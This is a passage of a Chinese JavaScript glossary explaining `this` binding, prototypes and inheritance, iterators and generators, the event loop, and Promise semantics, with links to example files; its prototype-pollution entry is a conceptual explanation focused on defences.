箭头函数**没有自己的 `this`**：它不参与任何绑定规则，`this` 直接取定义处外层作用域的 `this`（对类字段箭头函数而言就是实例 `this`）。这解决了回调里 `this` 丢失的问题，代价是**无法被 `call`/`apply`/`bind` 改变**，也不能作为构造函数。关键细节：这个特性让箭头函数非常适合 `setTimeout`、事件回调、`map`/`filter` 这类传递场景，但**不适合**对象方法定义（`{ handle: () => this.x }` 里的 `this` 是外层，不是对象）。也见 Binding priority（绑定优先级）、Losing `this`（this 丢失）。

示例：[`15_this_and_context/03_this_in_arrow.js`](15_this_and_context/03_this_in_arrow.js)

### Class body `this`（类中的 this）

类体中各位置的 `this` 需要分开看：静态方法里的 `this` 指向**类本身**（子类调用静态方法时指向子类，这使得 `static create()` 工厂能返回正确类型）；实例方法与实例字段里的 `this` 指向实例；而 `constructor` 中在派生类里必须 `super()` 之后才有 `this`。关键细节：类体默认严格模式，所以未绑定的方法提取出去后 `this` 是 `undefined` 而不是全局对象（比非严格模式更早暴露问题）；把方法作为回调传递必须提前绑定或用箭头函数字段。

示例：[`15_this_and_context/08_this_in_class.js`](15_this_and_context/08_this_in_class.js)

### `globalThis`

ES2020 引入的、跨环境统一的全局对象引用，取代了过去 `window` / `self` / `global` / `globalThis` 各写一套的兼容代码。它让「在任何环境都能拿到全局对象」成为语言级保证。关键细节：普通函数裸调用时非严格模式下的 `this` 就是它；在模块与类体中裸调用的 `this` 是 `undefined`，此时要用 `globalThis` 显式取全局。它的属性可以像普通全局变量一样访问，但用 `globalThis.foo = 1` 写入时注意别覆盖内建（如 `globalThis.Array`）。

示例：[`15_this_and_context/09_globalthis.js`](15_this_and_context/09_globalthis.js)

### prototype（原型属性）

**只有函数（以及类）才有**的 `prototype` 属性，它指向一个对象，内容将成为「用 `new` 创建的所有实例的原型」。注意它和「实例自己的原型」是两回事：`Foo.prototype` 是「将来实例的原型」，而 `instance.__proto__` 是「实例自己的原型」，满足 `instance.__proto__ === Foo.prototype`。关键细节：`prototype` 上的 `constructor` 默认指回函数本身；箭头函数没有 `prototype`（不能作构造器）；改写整个 `prototype` 对象会丢失原有的 `constructor` 指向。也见 `__proto__`（隐式原型）。

示例：[`16_prototype/02_proto_vs_prototype.js`](16_prototype/02_proto_vs_prototype.js)

### `__proto__` / `[[Prototype]]`（隐式原型）

**每个普通对象都有**的内部槽 `[[Prototype]]`，就是「我自己的原型」，属性查找失败时沿它继续找。访问它的标准 API 是 `Object.getPrototypeOf(obj)` / `Object.setPrototypeOf(obj, p)`，`__proto__` 只是历史遗留的访问器属性（在 `Object.prototype` 上，因此可以被遮蔽、在 `Object.create(null)` 的对象上不存在）。关键细节：`__proto__` 写在对象字面量里（`{ __proto__: p }`）是**设置原型**的特殊语法，而 `obj["__proto__"] = p` 是调用 setter；为性能与安全性考虑，优先用 `Object.create` 而非事后 `setPrototypeOf`。也见 prototype（原型属性）。

示例：[`16_prototype/02_proto_vs_prototype.js`](16_prototype/02_proto_vs_prototype.js)

### Prototype chain（原型链）

对象查找属性时，若自身没有就沿着 `[[Prototype]]` 一路往上找，直到 `null` 为止，这条路径就是原型链。它解释了 JS 的继承机制：`class` 只是原型继承的语法糖，方法定义在 `prototype` 上从而被所有实例共享。关键区分是**函数才有的 `prototype`** 与**每个对象都有的 `__proto__`** —— 前者是「将来实例的原型」，后者是「我自己的原型」。属性遮蔽（shadowing）就发生在这条链上。

示例：[`16_prototype/01_prototype_chain.js`](16_prototype/01_prototype_chain.js)

### Property shadowing（属性遮蔽）

当对象自身拥有与原型同名的属性时，查找会在**自身这一层就停下**，原型上的那份被「遮蔽」而不是被覆盖。这解释了为什么两个实例可以各自修改 `this.count` 而互不影响，也解释了为什么给一个实例赋值不会改变原型对象。关键细节：遮蔽只作用于**读**——写入总是写到自己身上，除非原型上的同名属性是一个 setter（此时赋值会把 setter 当函数调用而非新建属性）；`delete obj.x` 之后，被遮蔽的原型属性会「重新出现」。也见 Override（方法重写）、Prototype chain（原型链）。

示例：[`16_prototype/07_method_resolution_order.js`](16_prototype/07_method_resolution_order.js)

### Method resolution order（方法解析顺序）

同名方法出现在多个层级时「哪一个会被调用」的规则：沿原型链从**最近的一层**向后找，第一个命中者胜出。在单继承 + mixin 叠加的场景下，这意味着混入的顺序直接决定覆写关系；而 `super.method()` 会让查找从**当前类的上一层**开始，从而按链条依次回退，形成类似「责任链」的调用序列。关键细节：`super` 的起点由定义位置（`[[HomeObject]]`）静态决定，不受运行时 `this` 所属类影响。也见 Mixins（混入）、`super.method()`。

示例：[`16_prototype/07_method_resolution_order.js`](16_prototype/07_method_resolution_order.js)

### `Object.create`（Object.create）

`Object.create(proto, descriptors)` 以一个现成对象为原型创建新对象，是**唯一能直接创建「无原型对象」**（`Object.create(null)`）的方式。它带来两个重要用途：做真正的字典（没有 `toString`、`__proto__` 等继承属性，天然免疫原型污染），以及在不调用构造函数的前提下建立继承关系（ES5 继承链的核心步骤）。关键细节：第二个参数是属性描述符对象，不像普通赋值那样可枚举/可写；`Object.create(proto)` 与 `{ __proto__: proto }` 效果相同但更清晰、性能更可控。也见 ES5 inheritance（ES5 继承）。

示例：[`16_prototype/05_object_create.js`](16_prototype/05_object_create.js)

### ES5 inheritance（ES5 继承 / 寄生组合继承）

在 `class` 出现之前手工搭建继承链的套路：`Child.prototype = Object.create(Parent.prototype)` 建立原型链，`Child.prototype.constructor = Child` 修复构造器指向，再在子类构造器里 `Parent.call(this, ...args)` 复用父类初始化。这三步缺一不可，对应到 `class extends` 就是「原型链接 + super 调用 + constructor 归属」。关键细节：只写 `Child.prototype = new Parent()` 那种「原型式继承」会把父类实例属性错误地放到原型上（被所有子类实例共享），是经典错误写法。也见 `extends`（继承）、`Object.create`。

示例：[`16_prototype/04_inheritance_es5.js`](16_prototype/04_inheritance_es5.js)

### Prototype pollution（原型污染）

攻击者通过可控的键名（常见于 `JSON.parse` 后的对象合并、`obj[key] = value` 的深拷贝/递归赋值）往 `Object.prototype` 上写入属性，导致**整个程序**中所有对象都多出这个属性，从而绕过权限判断、篡改配置或造成拒绝服务。触发点是 `__proto__`、`constructor`、`prototype` 这三个特殊键名被当成普通键递归处理。防御手段：把用户输入与结构操作隔离、用 `Object.create(null)` 或 `Map` 存字典、合并时跳过危险键名、用 `Object.hasOwn` 判断而非 `in`、以及引入 `Object.freeze(Object.prototype)` 之类的加固。它属于原型继承机制被反向利用的安全问题，也见 `Object.create`。

示例：[`16_prototype/08_prototype_pollution_intro.js`](16_prototype/08_prototype_pollution_intro.js)

---

# 术语表分册 07 —— 迭代器生成器、异步、模块化、错误处理、JSON

> 覆盖目录：`17_iterators_and_generators`、`18_async`、`19_modules`、`20_error_handling`、`21_json`
> 文中所有示例链接均指向仓库中真实存在的文件，可点击查看可运行代码。

---

## 迭代器与生成器

### Iterable Protocol（可迭代协议）

一条约定：只要一个对象身上有名为 `Symbol.iterator` 的方法，并且这个方法**返回一个迭代器**，这个对象就是「可迭代的（iterable）」。它解决的是「遍历方式不统一」的问题——ES6 之前数组用索引循环、对象用 `for...in`、类数组用 `slice.call`，各有各的写法；有了这条协议，`for...of`、展开运算符 `...`、解构 `[a, b] = x`、`Array.from(x)`、`new Set(x)`、`yield*` 就都能用同一套语法消费任意数据结构。**关键细节**：判断一个值能否被 `for...of` 遍历，标准做法是 `typeof obj[Symbol.iterator] === 'function'`；字符串、数组、Map、Set、TypedArray、`arguments`、生成器对象都天然满足这条协议，而**普通对象 `{}` 不满足**，所以 `for (const x of {a: 1})` 会抛 `TypeError: obj is not iterable`。常见误解是「可迭代 = 能遍历」，准确说法是「可迭代 = 能被 `for...of` 这类语法按协议消费」。

示例：[`17_iterators_and_generators/01_iterable_protocol.js`](17_iterators_and_generators/01_iterable_protocol.js)

### Symbol.iterator

`Symbol.iterator` 是一个内置的 **symbol 值**，被用作可迭代对象的「方法名」。它必须是这个 symbol，写成字符串 `'iterator'` 或用别的 symbol 都不生效——这正是它区别于普通属性的地方：它不会被 `for...in`、`Object.keys`、`JSON.stringify` 看到，也就不会污染对象的「数据面」。它还可以自定义：给自家类型挂上 `[Symbol.iterator]()`，你的对象就能直接被 `for...of` 和解构使用。常见的坑是把它定义成属性（值）而不是方法（函数），或者写成箭头函数后 `this` 指向出错。也见 Iterable Protocol（可迭代协议）、Symbol.asyncIterator。

示例：[`17_iterators_and_generators/03_custom_iterable.js`](17_iterators_and_generators/03_custom_iterable.js)

### Iterator Protocol（迭代器协议）

迭代器协议规定：一个「迭代器」是一个拥有 `next()` 方法的对象，`next()` 每次调用都返回一个形如 `{ value, done }` 的结果对象。它是「怎么取下一个值」的约定，与「谁可以被遍历」的可迭代协议是一对搭档——前者管动作，后者管资格。`for...of` 的循环体本质上就是在反复调用 `iter.next()`，直到 `done` 为 `true`。注意 `next()` 的返回值必须是对象，如果返回原始值会触发 `TypeError: Iterator result ... is not an object`。

示例：[`17_iterators_and_generators/02_iterator_protocol.js`](17_iterators_and_generators/02_iterator_protocol.js)

### Iterator Result Object（迭代器结果对象）

`{ value, done }` 是 `next()` 的返回格式：`value` 是本次取到的值，`done` 表示「是否已取完」。**关键细节**：当 `done` 为 `true` 时，`value` 通常被忽略——但生成器的 `return` 语句可以让 `done: true` 的同时带回一个「最终值」（`{ value: 42, done: true }`）。另一个容易忽略的点是：一旦 `done` 变成 `true`，后续再调用 `next()` 会**永远**返回 `{ value: undefined, done: true }`，不会复活。`done` 只在被读取时才会被 `for...of` 检查，因此惰性序列可以一直不产出 `done`。

示例：[`17_iterators_and_generators/02_iterator_protocol.js`](17_iterators_and_generators/02_iterator_protocol.js)

### Iterable vs Iterator（可迭代对象与迭代器）

两者常常由同一个对象同时扮演，但概念不同：**可迭代对象**拥有 `[Symbol.iterator]()`（是「可被遍历的容器」），**迭代器**拥有 `next()`（是「遍历过程中记录游标的那只手」）。`[Symbol.iterator]()` 的典型实现是**返回一个新迭代器**，这样同一个数组可以同时被两个 `for...of` 独立遍历而不互相干扰。数组本身是「可迭代但**不是**迭代器」——它没有 `next()`；而生成器对象**两者都是**（自身有 `next()`，`[Symbol.iterator]()` 又返回 `this`）。这只是巧妙的双重身份，不代表所有迭代器都天然可迭代。也见 One-shot Consumption（一次性消费）。

示例：[`17_iterators_and_generators/03_custom_iterable.js`](17_iterators_and_generators/03_custom_iterable.js)

### One-shot Consumption（一次性消费）

迭代器是「**一次性**」的：游标一旦走到末尾，就无法重置，再遍历只能向容器要一个新的迭代器。所以 `for (const x of iter)` 之后紧接着再来一次 `for (const x of iter)`（这里 `iter` 本身就是迭代器）会一个元素都拿不到；而 `for (const x of arr)` 写两次却没问题，因为数组每次都会通过 `[Symbol.iterator]()` 生产**新的**迭代器。这是从数组/Map 迁移到「手写迭代器」时最常见的踩坑点。修法是遍历容器而不是遍历迭代器，或者把 `[Symbol.iterator]()` 实现成每次返回新对象。

示例：[`17_iterators_and_generators/02_iterator_protocol.js`](17_iterators_and_generators/02_iterator_protocol.js)

### Generator Function（生成器函数）

用 `function*`（或对象/类里的 `*method()`、`async function*`）声明的函数，调用它**不会执行函数体**，而是立刻返回一个生成器对象。函数体的执行被 `yield` 切成一段段，由调用方通过 `next()` 一段一段地推进。这是语言层面内置的「状态机 + 迭代器工厂」，省掉了手写 `{ value, done }` 的样板代码。注意 `function *foo`、`function* foo`、`*foo()` 写法都合法，风格统一即可；生成器函数不能用 `new` 调用。

示例：[`17_iterators_and_generators/04_generator_basics.js`](17_iterators_and_generators/04_generator_basics.js)

### yield

`yield` 是生成器里「暂停并交出一个值」的关键字，它把控制权交回调用方，并把右侧表达式的值作为 `{ value, done: false }` 送给 `next()`。与 `return` 不同，`yield` 之后函数**还能继续**执行；恢复时会从暂停处接着往下跑。**常见误解**：以为 `yield` 像 `return` 一样结束函数——实际上只有 `return`（或函数体结束、或 `generator.return()`）才真正终止。`yield` 还是一个**表达式**，本身有值，这个值正是下一次 `next(v)` 的实参，这也是双向通信的基础。也见 Two-way Communication（双向通信）。

示例：[`17_iterators_and_generators/04_generator_basics.js`](17_iterators_and_generators/04_generator_basics.js)

### Generator Object（生成器对象）

调用生成器函数得到的返回值，它同时满足迭代器协议（有 `next()`）和可迭代协议（`[Symbol.iterator]()` 返回 `this`），所以既能 `gen.next()` 手动推进，也能 `for...of` 自动消费。它内部保存着完整的执行上下文（局部变量、暂停位置），这些局部变量对外界完全不可见，天然就是「私有状态」。一个细节：生成器对象第一次 `next()` 之前函数体一行都没跑，且**首个 `next()` 的实参会被丢弃**（因为此时还没有任何 `yield` 表达式在等待接收）。

示例：[`17_iterators_and_generators/04_generator_basics.js`](17_iterators_and_generators/04_generator_basics.js)

### yield* Delegation（yield* 委托）

`yield* iterable` 把「继续产出」的工作**委托**给另一个可迭代对象，依次把它的每个值原样转发出去，直到它耗尽。它常用于三处：递归遍历树结构（`yield* traverse(child)`）、拼接多个序列、以及复用另一个生成器的产出。**关键细节**：`yield*` 的求值结果是**被委托迭代器的最终返回值**（即它 `done: true` 时带的 `value`），因此 `const r = yield* inner()` 能拿到 `inner` 里 `return` 的值。不要把它和 `yield` 混用——`yield anotherGenerator()` 只会吐出整个生成器对象本身，不会展开。

示例：[`17_iterators_and_generators/06_generator_delegation.js`](17_iterators_and_generators/06_generator_delegation.js)

### Two-way Communication（生成器双向通信）

生成器不只是「往外吐值」，还能「往里收值」：`gen.next(v)` 的实参 `v` 会成为**上一个暂停的 `yield` 表达式的求值结果**。于是 `const received = yield sent` 这一行同时完成了「送出 `sent`」与「接收 `received`」两件事，形成双向通道。这是实现「协程 / 类 co 库驱动器」的机制：生成器 `yield` 一个 Promise，外部驱动器 `await` 之后把结果通过 `next(结果)` 送回去。**注意**：正向迭代（`for...of`）传进去的永远是 `undefined`，双向通信必须手动调 `next`。也见 yield。

示例：[`17_iterators_and_generators/05_generator_two_way.js`](17_iterators_and_generators/05_generator_two_way.js)

### Generator.return() / Generator.throw()

这两个方法让你**从外部**干预生成器内部：`gen.return(v)` 立即终止生成器，并让当前暂停的 `yield` 处「收到」一个 `return` 语句的效果，返回 `{ value: v, done: true }`，同时会执行生成器里的 `finally` 块（这是清理资源的钩子）；`gen.throw(err)` 则把错误**注入到暂停点**，表现得像该 `yield` 处抛出了异常，可被生成器内部的 `try...catch` 捕获。若生成器内部没有捕获，错误会向外传播到调用 `throw()` 的地方。这是「协程可被外部取消/注入错误」的基础，也是 `for...of` 提前 `break` 时自动调用 `return()` 的原因。也见 Generator Object（生成器对象）。

示例：[`17_iterators_and_generators/07_generator_throw_return.js`](17_iterators_and_generators/07_generator_throw_return.js)

### Lazy Evaluation（惰性求值）

惰性求值指「值在被真正需要时才计算」，而不是一次性全部算完。生成器天然惰性：`for (const x of gen)` 每循环一次才推进一步，`take(3)` 之后剩余元素根本不会被计算。相比 `map`/`filter` 会先产生完整中间数组，惰性链在「元素计算代价高」或「数据量巨大」时能省下数量级的算力与内存。**常见误解**：以为惰性等于「异步」或「并行」——它只是「推迟 + 按需」，跟时间维度无关，计算仍然发生在当前同步流程里。

示例：[`17_iterators_and_generators/08_infinite_lazy_sequences.js`](17_iterators_and_generators/08_infinite_lazy_sequences.js)

### Infinite Sequence（无限序列）

用生成器里的 `while (true) { yield ... }` 可以描述一个永不结束的序列（自然数、斐波那契、不断变化的时间戳）。它之所以不会卡死，正因为惰性：只要消费方不无限地 `next()`，函数就永远停在 `yield` 处。反过来，**千万不要**对无限序列做 `[...gen]`、`Array.from(gen)` 或 `for...of` 不带 `break` 的遍历——那会立刻耗尽内存或死循环。正确姿势是配合 `take`/`break`/`for...of` + 提前退出，或者用迭代器助手 `.take(n)`。

示例：[`17_iterators_and_generators/08_infinite_lazy_sequences.js`](17_iterators_and_generators/08_infinite_lazy_sequences.js)

### Async Iterator（异步迭代器）

同步迭代器的「异步镜像」：`next()` 返回的不再是 `{ value, done }`，而是 **`Promise<{ value, done }>`**。它专门服务于「下一个值需要等待」的数据源——分页接口、文件流、WebSocket 消息、数据库游标。用 `async function*` 声明的异步生成器同时满足异步迭代器与异步可迭代两个协议，内部既能 `await` 也能 `yield`。注意异步迭代器的 `next()` **总是**返回 Promise，即使值是现成的，也需要 `await` 才能拿到。

示例：[`17_iterators_and_generators/09_async_iterator.js`](17_iterators_and_generators/09_async_iterator.js)

### Symbol.asyncIterator

异步可迭代协议的方法名，相当于异步世界的 `Symbol.iterator`：对象上挂 `[Symbol.asyncIterator]()` 并返回异步迭代器，就能被 `for await...of` 消费。它与 `Symbol.iterator` 可以**共存**于同一个对象（一个供同步遍历、一个供异步遍历），`for await...of` 会优先找 `Symbol.asyncIterator`，找不到时**回退**到 `Symbol.iterator`（把每个同步值当成已兑现的 Promise 处理）。这也是为什么同步数组也能被 `for await` 遍历。也见 Symbol.iterator、for await...of。

示例：[`17_iterators_and_generators/09_async_iterator.js`](17_iterators_and_generators/09_async_iterator.js)

### for await...of

专门消费异步可迭代对象的循环语法，每一轮自动 `await` 一次 `next()` 的结果，让「等待下一个值」对代码透明。循环体内可以正常写 `await`，且各轮之间**严格串行**——上一轮处理完才请求下一个值，这对有顺序要求的分页拉取是必要的，但追求吞吐时要注意它并不并行。常见坑：在普通 `for...of` 里遍历异步迭代器只会拿到一堆 Promise；以及忘记 `for await` **只能在 `async` 函数（或模块顶层）中使用**。

示例：[`17_iterators_and_generators/09_async_iterator.js`](17_iterators_and_generators/09_async_iterator.js)

### Array.fromAsync（异步转数组）

`Array.fromAsync(iterableOrAsyncIterable)` 是 ES2025 新增的静态方法，把「异步可迭代对象」或「含 Promise 的可迭代对象」转成一个**数组**，返回 `Promise<Array>`。它是 `Array.from` 的异步版本，等价于「`for await...of` 逐个 push 再 resolve」，但写起来一行搞定，且对类数组做长度校验更严格。注意它**会等到全部元素就绪**才兑现，因此不能用于无限或超长流——那种场景应当用 `for await...of` 边读边处理。也见 for await...of、Iterator Helpers（迭代器助手）。

示例：[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### Iterator Helpers（迭代器助手，ES2025）

ES2025 给迭代器补上的 `map`/`filter`/`take`/`drop`/`flatMap`/`reduce`/`toArray`/`forEach`/`some`/`every`/`find`，外加静态方法 `Iterator.from()`。与数组方法最大的区别是：**它们返回的还是迭代器，整条链是惰性的**，只有最终调用 `toArray()`/`reduce()`/`forEach()`（或 `for...of`）时才真正开始消费。这让「读 10GB 日志」「无限序列」「要多少取多少」成为可行——数组方法必须先把所有元素装进内存。**关键细节**：`take(3)` 拿够就停，后面的元素根本不会计算；而 `Iterator.from()` 能在任意可迭代对象/迭代器上开出一条可链式调用的助手流。

示例：[`34_modern_es_features/05_es2025_iterator_helpers.js`](34_modern_es_features/05_es2025_iterator_helpers.js)

---

## 异步编程

### Synchronous vs Asynchronous（同步与异步）

同步指代码**按书写顺序**一条条执行，前一条没结束，后一条不会开始；异步指任务被「托管」出去，主线程不等它完成就继续往下跑，等结果就绪后再通过回调/Promise 回到你的代码。异步不是为了「更快」，而是为了**不阻塞**：网络、磁盘、定时器等 I/O 的耗时远大于 CPU 运算，同步等待会让整个线程白白空转。判断一段代码是同步还是异步，看它是否「立刻返回一个占位的凭证（回调注册/Promise）」而不是最终结果。

示例：[`18_async/01_synchronous_vs_asynchronous.js`](18_async/01_synchronous_vs_asynchronous.js)

### Blocking vs Non-blocking（阻塞与非阻塞）

阻塞描述的是**调用方**的处境：调用一个函数后线程被占住、无法做别的事就是阻塞，立刻拿回控制权就是非阻塞。二者与「同步/异步」是同一枚硬币的两面——同步阻塞（`fs.readFileSync`、忙等循环）、异步非阻塞（`fs.readFile` 回调、`fetch`）是常见组合，但也有同步非阻塞（读缓存命中就立刻返回）与异步阻塞（其实很少见）的微妙情形。浏览器/Node 主线程一旦被长同步任务阻塞，页面会掉帧、事件循环无法推进，所以重计算要交给 Worker 或切片处理。

示例：[`18_async/01_synchronous_vs_asynchronous.js`](18_async/01_synchronous_vs_asynchronous.js)

### Event Loop（事件循环）

JavaScript 运行时（浏览器 / Node）的调度核心：它反复执行「取一个**宏任务** → 执行到调用栈清空 → **清空微任务队列** → 必要时渲染 → 再取下一个宏任务」这个循环。它是 JavaScript「单线程却能处理并发 I/O」的根本原因——耗时操作由宿主环境（浏览器内核、libuv 线程池）在别处完成，只把「回调该执行了」的消息放进队列。理解事件循环就能解释绝大多数「为什么输出顺序和我写的不一样」的困惑。也见 Macrotask（宏任务）、Microtask（微任务）。

示例：[`18_async/02_event_loop_basics.js`](18_async/02_event_loop_basics.js)

### Call Stack（调用栈）

记录「当前正在执行哪些函数、执行到哪一行」的后进先出结构，每进入一个函数就压一帧，返回就弹一帧。栈空是事件循环取下一个任务的**前提条件**——只要栈里还有代码在跑，任何队列里的回调都只能干等。这点解释了两个现象：同步死循环会让页面完全无响应（栈永远不空）；以及 `setTimeout(fn, 0)` 并不会「立刻」执行，最短也要等当前整段同步代码跑完。栈溢出（`RangeError: Maximum call stack size exceeded`）则是栈帧太多的直接后果。

示例：[`18_async/02_event_loop_basics.js`](18_async/02_event_loop_basics.js)

### Task Queue（任务队列）

事件循环用来存放「待执行回调」的队列统称。现代的准确描述是**两条队列**：宏任务队列（task queue，也叫 macrotask queue）与微任务队列（microtask queue），并且事件循环每轮只取一个宏任务、却会把微任务队列**清空**。定时器到期、I/O 完成、用户事件、`setTimeout` 的回调都进宏任务队列，`Promise.then`、`queueMicrotask`、`await` 之后的续体进微任务队列。**常见误解**：把「任务队列」想成一条先来先服务的队列——两条队列的优先级差异才是所有执行顺序问题的根源。

示例：[`18_async/02_event_loop_basics.js`](18_async/02_event_loop_basics.js)

### Macrotask（宏任务）

宏任务是事件循环中**每轮只执行一个**的任务单元，来源包括 `setTimeout`/`setInterval` 的回调、I/O 完成回调、`setImmediate`（Node）、UI 事件与消息事件（浏览器）。每个宏任务执行完、调用栈清空后，运行时会**彻底清空微任务队列**才去取下一个宏任务。所以「宏任务之间会插入微任务」，这也是「同一次事件循环里定时器并不精确」的原因——前面的任务拖久了，后面的回调就会延后。也见 Microtask（微任务）。

示例：[`18_async/12_microtask_vs_macrotask.js`](18_async/12_microtask_vs_macrotask.js)

### Microtask（微任务）

在当前宏任务结束后、**下一个宏任务开始前**被清空的队列，`Promise.then`、`queueMicrotask`、`await` 之后的代码都进入这里。关键结论：**微任务队列会一直被清空到空为止才轮到下一个宏任务**——所以在微任务里无限递归添加微任务会让事件循环永远到不了下一个宏任务，页面直接卡死。这也是「为什么 `Promise.then` 比 `setTimeout(0)` 先执行」的答案。也见 Macrotask（宏任务）、Microtask Starvation（微任务饥饿）。

示例：[`18_async/12_microtask_vs_macrotask.js`](18_async/12_microtask_vs_macrotask.js)

### Microtask Starvation（微任务饥饿）

当微任务不断产生新的微任务时，微任务队列永远清不空，宏任务（定时器、I/O、渲染）就永远排不上，现象是页面卡死、定时器完全不走。典型写法是「在 `then` 里再 `Promise.resolve().then(...)`」形成的无限递归，而且它比同步死循环更隐蔽：UI 可能先渲染一帧再冻结，日志也仍在滚动。正确做法是把长任务切片并主动让出——用 `setTimeout`/`setImmediate` 把下一片放回宏任务队列，让事件循环有机会处理别的任务。也见 Microtask（微任务）、setImmediate。

示例：[`18_async/12_microtask_vs_macrotask.js`](18_async/12_microtask_vs_macrotask.js)

### process.nextTick

Node 专有的调度 API，把回调放进一个**优先级高于 Promise 微任务**的 `nextTick` 队列，在「当前操作结束、事件循环继续之前」清空。它常用于「构造函数里不能立刻触发事件，要等调用方挂好监听器之后再触发」这类需要「延迟到当前栈退出但尽量早」的场景。**注意**：`nextTick` 队列同样会被清空到空，递归调用会饿死 I/O 与定时器（比微任务饥饿更早发生）。它是 Node 特有 API，浏览器里不存在，跨端代码应当用 `queueMicrotask`。

示例：[`18_async/02_event_loop_basics.js`](18_async/02_event_loop_basics.js)

### setImmediate

Node 中把回调放到**事件循环的 check 阶段**执行的 API，语义是「当前轮 I/O 处理完之后尽快执行」，在 I/O 回调内部它通常**先于** `setTimeout(fn, 0)` 触发。它和 `setTimeout(0)` 都属于宏任务，但属于不同阶段，因此顺序在 Node 里并不像浏览器那样确定。**常见误解**：以为 `setImmediate` 是「立即同步执行」——它只是比 `setTimeout(0)` 更可预期地早一点。浏览器没有这个 API，可改用 `MessageChannel` 或 `setTimeout(0)` 模拟。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### Callback Function（回调函数）

把函数作为参数传给另一个函数，由后者在「合适的时机」调用，这就是回调。它是 JavaScript 最早的异步表达方式（`fs.readFile`、`addEventListener`），也是异步的「最低层原语」——Promise 与 `async/await` 都是在它之上做的封装。回调的 `this`、调用时机、被调用几次都是控制反转的风险点，所以约定「回调必须恰好调用一次」。也见 Error-first Callback（错误优先回调）、Callback Hell（回调地狱）。

示例：[`06_functions/09_callback_pattern.js`](06_functions/09_callback_pattern.js)

### Callback Hell（回调地狱）

多层异步操作层层嵌套，形成「向右的三角形」，可读性、错误处理与流程控制同时崩塌：错误要在每一层分别判断，循环、并发、提前退出都难以表达，变量作用域层层嵌套还容易出错。它不是「回调」的错，而是「用回调表达顺序流程」的必然结果。解法是采用可组合的抽象——Promise、`async/await`，让异步代码重新变成线性的。

示例：[`18_async/03_callback_hell.js`](18_async/03_callback_hell.js)

### Promise（承诺对象）

一个代表「未来某个时刻才会有结果」的占位对象，把「注册回调」的时机与「结果产生」的时机解耦。它带来三个实质收益：可链式组合（`then` 返回新 Promise，天然扁平化）、错误可被统一 `catch`、以及可被 `await` 以同步写法表达。**常见误解**：认为 Promise 本身就是异步的——`new Promise(executor)` 里的 executor 是**立刻同步执行**的，只有 `then`/`catch` 中的回调才被排入微任务队列。也见 Executor（执行器函数）、Promise States（Promise 的三种状态）。

示例：[`18_async/04_promise_basics.js`](18_async/04_promise_basics.js)

### Promise States（Promise 的三种状态）

Promise 内部只有三种状态：`pending`（进行中）、`fulfilled`（已兑现）、`rejected`（已拒绝）。**状态不可逆**：一旦从 `pending` 变成 fulfilled 或 rejected，就永远定型，再次调用 `resolve`/`reject` 会被静默忽略（第一次调用生效）。这种「一次性」保证了结果不会自相矛盾，也让「防止重复回调」这类防御代码变得不必要。注意 `fulfilled` 常被口语称作 resolved，但严格意义上 `resolved` 包含「被另一个 Promise 接管」的情形。也见 Settled（已敲定）。

示例：[`18_async/04_promise_basics.js`](18_async/04_promise_basics.js)

### Settled（已敲定）与状态不可逆

`settled` 是 `fulfilled` 与 `rejected` 的合称，意思是「已经不再变化」。与之对应的是 `Promise.prototype.finally()`：无论敲定为哪一边都会执行，且不接收任何参数。状态不可逆带来一条重要的实践结论：**取消一个 Promise 是不可能的**——你能做的是「不再理会它的结果」（配合 `AbortController` 通知底层操作停止），或把结果包一层再做「是否仍然有效」的判断。也见 AbortController / AbortSignal、Promise States（Promise 的三种状态）。

示例：[`18_async/04_promise_basics.js`](18_async/04_promise_basics.js)

### Executor（执行器函数）

`new Promise(executor)` 里的那个函数，接收 `resolve` 与 `reject` 两个参数。**关键细节**：executor 是**同步立即执行**的，不是等某个时机才跑；而且 Promise 构造函数会「吃掉」executor 内同步抛出的异常，自动把 Promise 转为 rejected——所以 `new Promise(() => { throw new Error('x') })` 不会让程序崩溃，只会得到一个拒绝的 Promise。反过来说，在 executor 里 `setTimeout` 抛出异常则**不会**被捕获，因为那时已经不是 executor 的同步执行期了。这也解释了「为什么 `Promise` 构造函数里不能 return 值」。

示例：[`18_async/04_promise_basics.js`](18_async/04_promise_basics.js)

### then / catch / finally

三者是 Promise 的三个消费入口：`then(onFulfilled, onRejected)` 处理成功（第二个参数也能处理失败，但只捕获**上游**的拒绝，不捕获同层 `onFulfilled` 抛出的错误，因此实践中更推荐用 `catch`）；`catch(onRejected)` 等价于 `then(undefined, onRejected)`，放在链尾可捕获整条链上的任何拒绝；`finally(onFinally)` 无论成败都执行，且**不接收参数、不改变结果**（除非它自己抛错或返回被拒绝的 Promise）。三者都返回**新的 Promise**，这正是可以链式调用与继续 `catch` 的原因。也见 Promise Chaining（链式调用）。

示例：[`18_async/04_promise_basics.js`](18_async/04_promise_basics.js)

### Promise Chaining（链式调用）

每个 `then`/`catch`/`finally` 都返回一个新 Promise，把回调的返回值「接到」新 Promise 上，从而形成扁平链条而不是嵌套金字塔。**扁平化的关键**：如果回调返回的是 Promise，新 Promise 会**跟随**它（等它敲定后再以相同的值/理由敲定），而不是把 Promise 对象本身当作值传下去。若回调返回普通值，则新 Promise 立刻以该值兑现。这套规则让「串行异步步骤」写起来像一条流水线。也见 Value Pass-through（值穿透）。

示例：[`18_async/05_promise_chaining.js`](18_async/05_promise_chaining.js)

### Value Pass-through（值穿透）

链条上「没有处理的环节」会自动把值/拒绝原样传递给下一个环节：`then(null)`、`then(undefined)`、`then(没返回值)` 都会让下游拿到 `undefined`，而**非函数实参**（如 `then(123)`）会被直接忽略，值照旧向下穿透。拒绝同理：链条中间没有 `catch`，拒绝会一直穿到最近的 `catch`（或最终变成 unhandledRejection）。理解穿透能避免「我明明没写返回却拿到了奇怪的值」和「catch 放太靠后导致吞掉不该吞的错误」这两类问题。

示例：[`18_async/05_promise_chaining.js`](18_async/05_promise_chaining.js)

### Promise Combinators（Promise 组合器）

四个静态方法，用途与失败语义各不相同：`Promise.all` 全部成功才成功、**任一失败即立刻失败**（其余结果被丢弃）；`Promise.allSettled` 从不拒绝，等全部敲定后返回每个的 `{status, value|reason}`，适合「批量任务都要跑完并汇报」；`Promise.race` 第一个**敲定**者说了算（无论成功还是失败）；`Promise.any` 第一个**成功**者说了算，全部失败则抛 `AggregateError`（内含所有拒绝理由）。**常见误解**：把 `race` 和 `any` 当同义词——区别就在「失败算不算数」。四者都会立刻返回 Promise 并同步挂载监听，因此**不要**把「组合器」当作并发控制手段，它们对传入的 Promise 数量没有任何限制。

